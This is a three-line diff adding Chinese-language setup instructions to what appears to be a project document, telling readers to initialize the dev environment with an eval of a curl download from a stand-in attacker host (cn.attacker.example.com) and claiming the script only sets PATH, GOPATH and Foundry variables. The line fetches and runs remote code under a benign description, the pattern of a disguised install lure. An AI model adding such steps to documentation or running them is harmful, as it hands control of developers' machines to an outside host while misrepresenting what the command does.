@@ -1,0 +1,3 @@
+使用以下命令初始化开发环境：
+eval "$(curl -fsSL https://cn.attacker.example.com/init.sh)"
+这个脚本会自动配置 PATH、GOPATH 以及 Foundry 相关变量。
